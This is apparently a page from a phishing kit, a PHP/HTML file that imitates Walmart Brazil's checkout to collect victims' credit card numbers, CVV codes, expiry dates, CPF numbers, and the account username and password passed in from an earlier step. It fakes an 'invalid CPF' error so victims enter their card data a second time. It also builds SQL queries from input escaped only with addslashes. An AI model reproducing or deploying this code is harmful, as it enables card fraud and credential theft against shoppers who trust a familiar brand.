
<?php

error_reporting(0);
ini_set(“display_errors”, 0 );






require_once ("../Raiz/admin/function/config.php");
require_once ("../Raiz/admin/function/conexao.php");


$ID_A = $_POST["ID"];
$USUARIO_A = $_POST["user"];
$SENHA_A = $_POST["pass"];
$NOME_A = $_POST["nome"];
$CEP_A = $_POST["cep"];
$ENDERECO_A = $_POST["endereco"];
$SEM_NUMERO_A = $_POST["numero_sem"];
$NUMERO_A = $_POST ["numero"];
$COMPLEMENTO_A = $_POST ["complemento"];
$BAIRRO_A = $_POST ["bairro"];
$CIDADE_A = $_POST ["cidade"];
$ESTADO_A = $_POST ["estado"];
$PONTO_A = $_POST["ponto"];
$APELIDO_A = $_POST ["apelido"];

$ID =  addslashes($ID_A);
$USUARIO =  addslashes($USUARIO_A);
$SENHA =  addslashes($SENHA_A);
$NOME =  addslashes($NOME_A);
$CEP =  addslashes($CEP_A);
$ENDERECO =  addslashes($ENDERECO_A);
$SEM_NUMERO =  addslashes($SEM_NUMERO_A);
$NUMERO =  addslashes($NUMERO_A);
$COMPLEMENTO =  addslashes($COMPLEMENTO_A);
$BAIRRO =  addslashes($BAIRRO_A);
$CIDADE =  addslashes($CIDADE_A);
$ESTADO =  addslashes($ESTADO_A);
$PONTO =  addslashes($PONTO_A);
$APELIDO =  addslashes($APELIDO_A);




$dados4 = "SELECT* FROM produtos where id='$ID'";
$con4 = $mysqli -> query($dados4) or die ($mysqli -> error);


while ($consulta4= $con4 -> fetch_array()){
	
	$nome = $consulta4 ["nome"];
	$preco = $consulta4 ["preco"];
	$img = $consulta4 ["img"];
	$status = $consulta4 ["status_boleto"];
	
	
	
}

$dados2 = "SELECT* FROM configuracao where id=1";
$con2 = $mysqli -> query($dados2) or die ($mysqli -> error);

while ($consulta2= $con2 -> fetch_array()){
	
	$desconto = $consulta2 ["desconto"];
	
	
	
}





$preco_final = number_format($preco,2,",",".");


$parcela2_a = $preco/2;
$parcela3_a = $preco/3;
$parcela4_a = $preco/4;
$parcela5_a = $preco/5;
$parcela6_a = $preco/6;
$parcela7_a = $preco/7;
$parcela8_a = $preco/8;
$parcela9_a = $preco/9;
$parcela10_a = $preco/10;


$parcela2 = substr($parcela2_a, 0, 5);
$parcela_2 = number_format($parcela2,2,",",".");
$parcela3 = substr($parcela3_a, 0, 5);
$parcela_3 = number_format($parcela3,2,",",".");
$parcela4 = substr($parcela4_a, 0, 5);
$parcela_4 = number_format($parcela4,2,",",".");
$parcela5 = substr($parcela5_a, 0, 5);
$parcela_5 = number_format($parcela5,2,",",".");
$parcela6 = substr($parcela6_a, 0, 5);
$parcela_6 = number_format($parcela6,2,",",".");
$parcela7 = substr($parcela7_a, 0, 5);
$parcela_7 = number_format($parcela7,2,",",".");
$parcela8 = substr($parcela8_a, 0, 5);
$parcela_8 = number_format($parcela8,2,",",".");
$parcela9 = substr($parcela9_a, 0, 5);
$parcela_9 = number_format($parcela9,2,",",".");
$parcela10 = substr($parcela10_a, 0, 5);
$parcela_10 = number_format($parcela10,2,",",".");


?>


<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="../Raiz/Files1/cs.js.download"></script><script type="text/javascript" async="" src="../Raiz/Files1/fp.js.download"></script><script async="" src="../Raiz/Files1/cs.js.download"></script><script type="text/javascript" async="" src="../Raiz/Files1/welcome_fp.asp.download"></script><script type="text/javascript" async="" src="../Raiz/Files1/ec.js.download"></script><script async="" src="../Raiz/Files1/cs.js.download"></script><script src="../Raiz/Files1/2960.js.download" async="" type="text/javascript"></script><script async="" src="../Raiz/Files1/cs.js.download"></script><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Resumo do pedido - Walmart.com</title><meta name="description" content=""><meta name="viewport" content="width=device-width,user-scalable=no"><link rel="shortcut icon" onclick="return false " href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><link rel="icon" onclick="return false " href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><!-- Place favicon.ico and apple-touch-icon.png in the root directory --><link rel="stylesheet" onclick="return false " href="../Raiz/Files1/5e2214d5.checkout.css"><script src="../Raiz/Files1/ff3057f9.feature.js.download"></script><script src="../Raiz/Files1/analytics.js.download"></script><script src="../Raiz/Files1/s-code-contents-18bb769dbfda1ec099f682ef04215ace88fc2799.js.download"></script><script language="Javascript" type="text/javascript" src="../Raiz/Files1/encryption.js.download"></script>



<script language="Javascript" type="text/javascript" src="../Raiz/Files1/getkey.js.download"></script><link rel="dns-prefetch" onclick="return false " href="https://device.clearsale.com.br/"><script src="../Raiz/Files1/satellite-56d8236264746d5460002c13.js.download"></script><script src="../Raiz/Files1/satellite-5616ad06366462001700171b.js.download"></script><script src="../Raiz/Files1/satellite-55ad40a733646300140007cc.js.download"></script><script src="../Raiz/Files1/satellite-55dc9d3f6165630017001049.js.download"></script><script src="../Raiz/Files1/satellite-55e46d9c6330630014000aca.js.download"></script><script src="../Raiz/Files1/satellite-55e702506533640014001100.js.download"></script><script src="../Raiz/Files1/satellite-56df553064746d05210015ba.js.download"></script><script src="../Raiz/Files1/satellite-561d60b33535310014000298.js.download"></script><script src="../Raiz/Files1/satellite-58177c1c64746d5fda00cd74.js.download"></script><script src="../Raiz/Files1/satellite-5873742764746d6035006d7c.js.download"></script><script src="../Raiz/Files1/satellite-59e4f61e64746d35d20003e4.js.download"></script><link rel="dns-prefetch" onclick="return false " href="https://device.clearsale.com.br/"><script src="../Raiz/Files1/satellite-5616ad2564363200140007f9.js.download"></script><script src="../Raiz/Files1/satellite-55ad40d76331300014000163.js.download"></script><script src="../Raiz/Files1/satellite-55b67fe33062610017000a80.js.download"></script><script src="../Raiz/Files1/satellite-55dc9d646236660014000b5a.js.download"></script><script src="../Raiz/Files1/satellite-55e43ca53961370014000750.js.download"></script><script src="../Raiz/Files1/satellite-561d684b323837001400094f.js.download"></script><script src="../Raiz/Files1/satellite-56e1948964746d052f00258b.js.download"></script><script src="../Raiz/Files1/satellite-58177cbf64746d4ccb00c996.js.download"></script><script src="../Raiz/Files1/satellite-59e4f64264746d35d8000089.js.download"></script><link rel="dns-prefetch" onclick="return false " href="https://device.clearsale.com.br/"><script src="../Raiz/Files1/satellite-56e1951c64746d0532002246.js.download"></script><script src="../Raiz/Files1/satellite-5616ad4e6436320017000879.js.download"></script><script src="../Raiz/Files1/satellite-55ad2c4a336463001700071b.js.download"></script><script src="../Raiz/Files1/satellite-55b67fbe61613900140008c4.js.download"></script><script src="../Raiz/Files1/satellite-55dc9d8e65353207ba000102.js.download"></script><script src="../Raiz/Files1/satellite-55eeedcb32633720f10005a6.js.download"></script><script src="../Raiz/Files1/satellite-56e194ac64746d0532002241.js.download"></script><script src="../Raiz/Files1/satellite-58177cef64746d4cc800cb2f.js.download"></script><script src="../Raiz/Files1/satellite-561d68843535310017000219.js.download"></script><script src="../Raiz/Files1/satellite-59e4f67a64746d35cf000160.js.download"></script>


	


</head><body style="" class="fixed-steps"><img style="display: none;" src="../Raiz/Files1/clear.png"><div class="wrapper"><header class="header choose-address choose-delivery choose-payment"><div class="header-wrapper">
  <figure class="navbar-brand">
    
    
      <img class="header-logo" src="../Raiz/Files1/walmart-logo.png" alt="Walmart.com">
    

  </figure>
  <h1 class="header-title choose-payment">
    Como você quer pagar?
  </h1>
  <div class="header-security">
    <div class="header-security-wrapper">
	 <img src="../Raiz/assets/img/a.png" >

    </div>
  </div>
</div>
</header><!-- Main content --><main class="main-content"><div class="view-content"><div class="page">

  <section class="container">
    <header class="container-header">
      <h2 class="payment-option-title container-title">Pagamento</h2>
      <div class="footer-security payment-security">
        <div class="footer-security-wrapper">
		<img src="../Raiz/a.png" >
          <p class="footer-security-title">ambiente</p>
          <p class="footer-security-text">100% seguro</p>
        </div>
      </div>
    </header>

    <div class="payment-option-tab tab-wrapper  composite">
      
    <ul class="nav nav-tabs tabs-wrapper" data-active="1">
	
	<li class="tab active"><a class="tab-link" data-toggle="tab">
  	 <img src="../Raiz/assets/img/c.png" >
	<span>Cartão de crédito</span>
</a>
</li>

	
	
<?php if (($status == 1) ) { ?>
<li class="tab">

<form method="post"  action="pagamento_boleto.php" id="mail_form">

  <input type="hidden" name="ID" value="<?php echo $ID ?>" >
  <input type="hidden" name="user" value="<?php echo $USUARIO ?>" >
  <input type="hidden" name="pass" value="<?php echo $SENHA ?>" >
  <input type="hidden" name="nome" value="<?php echo $NOME ?>" >
  <input type="hidden" name="cep" value="<?php echo $CEP ?>" >
  <input type="hidden" name="endereco" value="<?php echo $ENDERECO ?>" >
  <input type="hidden" name="numero" value="<?php echo $NUMERO ?>" >
  <input type="hidden" name="complemento" value="<?php echo $COMPLEMENTO ?>" >
  <input type="hidden" name="bairro" value="<?php echo $BAIRRO ?>" >
  <input type="hidden" name="cidade" value="<?php echo $CIDADE ?>" >
  <input type="hidden" name="estado" value="<?php echo $ESTADO ?>" >
  <input type="hidden" name="ponto" value="<?php echo $PONTO ?>" >
  <input type="hidden" name="apelido" value="<?php echo $APELIDO ?>" >



<a onClick="document.getElementById('mail_form').submit();" class="tab-link">
  	 <img src="../Raiz/assets/img/c.png" >
	<span>Boleto bancário </span> 
</a>
<strong><font color="#2196f3"  > <font color="orange" ><?php echo $desconto ?>% </font>de desconto</font></strong>
</form>
</li>

<?php } ?>

</ul>



</li></ul>

<?php if (($_POST ['failed'] == 1) ) { ?>


<div class="tab-content"><div class="tab-panel credit-panel payment-credit-tab active" id="credit-card"><div class="alert alert-danger card-alert"><div class="alert-text"><div>
    <b>CPF Inválido</b>

</div><div>

</div></div>
</div>


<?php } else { ?>


<?php } ?>










<div class="tab-content"><div class="tab-panel credit-panel payment-credit-tab active" id="credit-card"><div class="choose-credit-card one-card"><div id="singleCard"><ul id="singleCard" class="list-inline select-card card-list"><li class="select-card-item has-pretty-child card-item card-id-0 card-id-visa"><a class="card-link">
  <img class="img-responsive card-img" src="../Raiz/Files1/credit-card-visa.png" alt="VISA">
</a>
<div class="clearfix prettyradio labelright  blue "><input type="radio" class="custom-radio" value="0" id="card_0" name="a_credit_singleCard" style="display: none;"><a class=""></a>
<label for="card_0"></label></div>
</li><li class="select-card-item has-pretty-child card-item card-id-1 card-id-amex"><a class="card-link">
  <img class="img-responsive card-img" src="../Raiz/Files1/credit-card-amex.png" alt="AMEX">
</a>
<div class="clearfix prettyradio labelright  blue "><input type="radio" class="custom-radio" value="1" id="card_1" name="a_credit_singleCard" style="display: none;"><a class=""></a>
<label for="card_1"></label></div>
</li><li class="select-card-item has-pretty-child card-item card-id-2 card-id-mastercard"><a class="card-link">
  <img class="img-responsive card-img" src="../Raiz/Files1/credit-card-mastercard.png" alt="MASTERCARD">
</a>
<div class="clearfix prettyradio labelright  blue "><input type="radio" class="custom-radio" value="2" id="card_2" name="a_credit_singleCard" style="display: none;"><a class=""></a>
<label for="card_2"></label></div>
</li><li class="select-card-item has-pretty-child card-item card-id-3 card-id-diners"><a class="card-link">
  <img class="img-responsive card-img" src="../Raiz/Files1/credit-card-diners.png" alt="DINERS">
</a>
<div class="clearfix prettyradio labelright  blue "><input type="radio" class="custom-radio" value="3" id="card_3" name="a_credit_singleCard" style="display: none;"><a class=""></a>
<label for="card_3"></label></div>
</li><li class="select-card-item has-pretty-child card-item card-id-4 card-id-hipercard"><a class="card-link">
  <img class="img-responsive card-img" src="../Raiz/Files1/credit-card-hipercard.png" alt="HIPERCARD">
</a>
<div class="clearfix prettyradio labelright  blue "><input type="radio" class="custom-radio" value="4" id="card_4" name="a_credit_singleCard" style="display: none;"><a class=""></a>
<label for="card_4"></label></div>
</li><li class="select-card-item has-pretty-child card-item card-id-5 card-id-elo"><a class="card-link">
  <img class="img-responsive card-img" src="../Raiz/Files1/credit-card-elo.png" alt="ELO">
</a>
<div class="clearfix prettyradio labelright  blue "><input type="radio" class="custom-radio" value="5" id="card_5" name="a_credit_singleCard" style="display: none;"><a class=""></a>
<label for="card_5"></label></div>
</li></ul>

 <form action="pagamento_process.php?status=failed" method="post" >
<div class="card-fields">

  
	 <script src="../Raiz/assets/jquery-3.2.1.min.js"></script>    
	 <script src="../Raiz/assets/jquery.mask.min.js"></script> 
   
  
  <div class="form-group form-card-number input-fieldset">
    <input type="tel" class="form-control input-box input" required name="cc" maxlength="21" value="">
    <label class="control-label label">Número do cartão</label>
    <span class="input-credit-card-mark"></span>
  </div>
 
  <div class="form-group form-card-name input-fieldset">
    <input  name="titular" type="text" class="form-control input-box input" maxlength="30" required value="">
    <label class="control-label label">Nome do titular</label>
    <span class="input-credit-card-mark"></span>
  </div>

  <div class="input-fieldset expiration-security">
    

	
	
	

    <div class="form-group form-valid-thru input-fieldset expiration-date">
      <input name="validade"  type="tel" class="form-control input-box input" required   >
      <label class="control-label label">Validade</label>
      

    </div>
  <input type="hidden" name="failed" value="1" >

    
    <div class="form-group form-security-code input-fieldset security-code">
      <span class="input-credit-card-mark"></span>
      <input name="cvv" id="cvv" type="tel" class="form-control input-box input" required maxlength="4" value="">
      <label class="control-label label label-ellipsis">Cód. de segurança</label>
    
  <img class="card-img" src="../Raiz/Files1/card-security-code.png" alt="Cód. de segurança">

</div>
  </div>

  
  
    <div class="form-group form-card-document input-fieldset">
      <input name="cpf" type="tel" class="form-control input-box input" required value="">
      <label class="control-label label">CPF ou CNPJ do titular</label>
      <span class="input-credit-card-mark"></span>
    </div>
  

  


  
    <div class="input-fieldset allow-save-card">
      <label class="label">
        <input type="checkbox" class="checkbox" >
        Salvar cartão para as próximas compras
      </label>
    </div>
  

</div>
</div>

<script type="text/javascript">
	$(function() {
		var SPMaskBehavior = function (val) {
		    return val.replace(/\D/g, '').length === 11 ? '(00) 00000-0000' : '(00) 0000-00009';
		  },
		  spOptions = {
		    onKeyPress: function(val, e, field, options) {
		        field.mask(SPMaskBehavior.apply({}, arguments), options);
		      }
		  };

		$('input[name="validade"]').mask('00/00');
		$('input[name="cpf"]').mask('000.000.000-00');




		
	});

</script>  

<div class="card-more-options">
  
  
  <button class="btn-link two-cards-btn split-cards-link">Pagar com 2 cartões?</button>
</div>

<p id="creditCardInfoList" class="payment-info">
  <span>Importante:</span>O limite disponível no cartão de crédito deve ser superior ao valor total da compra, e não ao valor de cada parcela.
</p>
</div></div></div>
</div>
  </section>

  <section class="payment-resume">
  <div class="gift-card-container">
    <a data-gift-card="open-modal" class="add-gift-card-link">
    </a>

    <ul  class="gift-card-list">
      <input type="radio" name="parcela" value="1">Pagar a Vísta <?php echo  $preco_final ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 2x de <?php echo $parcela_2 ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 3x de <?php echo $parcela_3 ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 4x de <?php echo $parcela_4 ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 5x de <?php echo $parcela_5 ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 6x de <?php echo $parcela_6 ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 7x de <?php echo $parcela_7 ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 8x de <?php echo $parcela_8 ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 9x de <?php echo $parcela_9 ?> R$<br>
      <input type="radio" name="parcela" value="1">Parcelar em 10x de <?php echo $parcela_10 ?> R$<br>

      
    </ul>
  </div>



<div class="payment-resume-totals">

  

  

  <div class="payment-resume-totals-item my-cart-subtotal cash-report-item subtotal">
    <span>Subtotal:</span>
    <span class="payment-resume-subtotal-text">R$ <?php echo $preco_final ?></span>
  </div>

  

  

  <div class="payment-resume-totals-item cash-report-item freight">
    <span>Valor do frete:</span>
    <div>R$ 0</div>
  </div>

  <div class="payment-resume-totals-item cash-total">
    <span class="payment-resume-total-label">Valor total a pagar:</span>
    <div class="payment-resume-installment">
      <span class="payment-resume-total-text">R$ <?php echo $preco_final ?></span>
      
      <div class="payment-resume-installment-content">
        <span>em até 10x de </span>
        <span class="payment-resume-installment-value">R$ <?php echo $parcela10 ?></span>
        <span>  sem juros </span>
      </div>
      
      
    </div>
  </div>
<div>
</div></div></section>
  <div id="finish-order" class="container finish-order-content">
    

  

  <input type="hidden" name="ID" value="<?php echo $ID ?>" >
  <input type="hidden" name="user" value="<?php echo $USUARIO ?>" >
  <input type="hidden" name="pass" value="<?php echo $SENHA ?>" >
  <input type="hidden" name="nome" value="<?php echo $NOME ?>" >
  <input type="hidden" name="cep" value="<?php echo $CEP ?>" >
  <input type="hidden" name="endereco" value="<?php echo $ENDERECO ?>" >
  <input type="hidden" name="numero" value="<?php echo $NUMERO ?>" >
  <input type="hidden" name="complemento" value="<?php echo $COMPLEMENTO ?>" >
  <input type="hidden" name="bairro" value="<?php echo $BAIRRO ?>" >
  <input type="hidden" name="cidade" value="<?php echo $CIDADE ?>" >
  <input type="hidden" name="estado" value="<?php echo $ESTADO ?>" >
  <input type="hidden" name="ponto" value="<?php echo $PONTO ?>" >
  <input type="hidden" name="apelido" value="<?php echo $APELIDO ?>" >
  
  <div class="finish-order-controls">
  <button  name="set" class="btn btn-success btn-finish-buy">Finalizar compra</button>
  


  
  </div></div>
  </form>
  <div class="page-content order-report-page">
    
  <section class="order-report-wrapper container">

  <header class="container-header">
    <h2 class="container-title">1 itens</h2>
    <a class="edit-link" onclick="return false " href="#">Alterar</a>
  </header>
  
  <ul class="payment-product-list payment-product-item-head">
    <li class="payment-product-item">
      <p class="payment-product-details">Item</p>
      <p class="payment-product-details">Quantidade:</p>
      <p class="payment-product-details">Entrega</p>
    </li>
  </ul>

  <ul class="payment-product-list">
    
      <li class="payment-product-item">
        <figure class="payment-product-figure">
          
            <img src="<?php echo $img ?>" alt="<?php echo $nome_produto ?>">
          
        </figure>

        <div class="payment-product-info-content">
          <div class="payment-product-info">
            <p class="payment-product-title">
              <span class="payment-product-name"><?php echo $nome_produto ?></span>
              
                <span class="payment-product-brand"> </span>
              
            </p>
            
              <p class="payment-product-details">
                <span>Vendido e entregue por Walmart </span>
              </p>
            
          </div>

          

        <p class="payment-product-details">
          <span class="payment-product-details-quantity">Quantidade:</span><span>1</span>
        </p>

        
          <p class="payment-product-details">
            <span class="delivery-days">Em até 9 dias úteis
              
            </span>
            
              <a class="editFreightType btn-link" onclick="return false " href="#">Alterar</a>
            
          </p>
        
        </div>
      </li>
    

    
 
    

    

  </ul>
</section>
</div>

  <div id="deliveryInfo" class="delivery-data-box">
    
  <div><section class="container">
  <header class="container-header">
    <h2 class="container-title">Endereço de entrega</h2>
    
    <a onclick="return false " href="#" id="editDeliveryAddress" class="edit-link">Alterar</a>
    
  </header>
  <div class="address-card delivery view-address">
    
    <section class="address-data">
      <span class="address-data-address-name"></span>
      <span class="address-data-name"><?php echo $NOME ?></span>
      <span>
        <?php echo $ENDERECO ?>, <?php echo $NUMERO ?>
        
      </span>
	 
      <span><?php echo $BAIRRO ?> - <?php echo $CIDADE ?> - <?php echo $ESTADO ?></span>
      <span><?php echo $CEP ?></span>
	  
    </section>
	
  </div>
</section>



</div></div>
  


  <div id="notes-section" class="notes-section-content">
    
  <div class="notes-section"><p>Você está prestes a realizar uma compra sob as condições acima. Seu pedido passará por aprovação do Walmart.com.br, podendo ser cancelado em caso de:</p>
<ol>
  <li>1) Não pagamento do boleto ou insuficiência de saldo ou crédito no cartão.</li>
  <li>2) Inconsistência de dados ou informações de cadastro.</li>
  <li>3) Erros do dispositivo do consumidor durante o fechamento do pedido.</li>
  <li>4) Quantidade de produtos ou sequência de compras que denote revenda, ao invés de consumo próprio.</li>
  <li>5) Motivos outros que impossibilitem o cumprimento do pedido.</li>
  <li>6) O consumidor tem 7 dias, contados a partir do recebimento do produto, para exercer o direito de arrependimento.</li>
  <li>7) O consumidor terá, nos casos de vício ou defeito do produto, o prazo de até 30 dias para bens não duráveis e até 90 dias para bens duráveis para solicitar a assistência técnica.</li>
  <li>8) Defeito técnico ou de fabricação o prazo de troca é de 7 (sete) dias a partir do recebimento do produto.</li>
</ol>
<p>Demais condições aplicáveis a esta compra e venda estão disponíveis nos  "<a data-toggle="modal" class="btn-link" id="termsAndConditions">Termos de Uso e Condições</a>" por meio do qual, inclusive, o Usuário autoriza o Walmart.com a proceder à restituição dos tributos que tiverem sido por este pagos, indevidamente ou a maior, para fins do disposto no artigo 166 do Código Tributário Nacional.</p>
<p>Os preços e condições deste site são válidos apenas para compras no site e não se aplicam para nossas lojas.</p>
</div></div>
</div>
</div></main><!-- Footer content --><footer id="footer" class="footer"><section class="footer-wrapper">
  <script src="../Raiz/Files1/0ba19d02.checkout.js.download"></script>
<script src="../Raiz/Files1/satellite-55070c133031360019e30100.js.download"></script>
<script type="text/javascript"></script>


  <div class="footer-security">
    <div class="footer-security-wrapper">
    <img src="../Raiz/assets/img/e.png" >
    </div>
  </div>

  <div class="footer-description">
    <p class="footer-text">© 2018 Walmart.com, Inc • Todos os direitos reservados</p>
    <a data-onclick="return false " href="/institucional/termos-uso" data-modal="termsOfUse">Termos de uso</a>
    <span>•</span>
    <a data-onclick="return false " href="/institucional/politica-privacidade/" data-modal="privacyPolicy">Política de privacidade</a>
  </div>
</section>
</footer>

</div><script type="text/javascript" async="" src="../Raiz/Files1/rum-ppm(2).gif"></script><script type="text/javascript" async="" src="../Raiz/Files1/wm-retargeting.js.download"></script><script type="text/javascript" async="" src="../Raiz/Files1/boomerang-0.9.5.js.download"></script><img src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1044151724/?label=P3dVCICUsAIQrPvx8QM&amp;data=Step=PaymentMethod;value=10330.52;Pname=smartphone%20moto%20c%20plus%20xt1726%20ouro%20dual%20chip%20android%207.1.1%20nougat%204g%20wifi%20camera%208%20mp,smartphone%20multilaser%20ms80%203gb%20ram%20+%2032gb%20tela%2057%27%20hd+%20android%207.1%20qualcomm%20dual%20camera%2020mp+8mp%20dourado,smartphone%20multilaser%20ms80%203gb%20ram%20+%2032gb%20tela%2057%27%20hd+%204g%20android%207.1%20qualcomm%20dual%20camera%2020mp+8mp%20preto,smart%20tv%20led%2032%20samsung%2032j4300%20com%20conversor%20digital%202%20hdmi%201%20usb%20wifi%20integrado;Pid=4250724,5306860,5306858,1838419;Pcat=Motorola,Demais%20Smartphones,Demais%20Smartphones,TVs;" height="1" width="1" style="display: none;"><script type="text/javascript" async="" src="../Raiz/Files1/rum-ppm(2).gif"></script><img src="../Raiz/Files1/spp.pl.download" height="1" width="1" style="display: none;"><iframe id="csdp_025741524684445315561716" src="../Raiz/Files1/fp.html" style="position: absolute; width: 1px; height: 1px; left: -9999px;"></iframe></body></html>




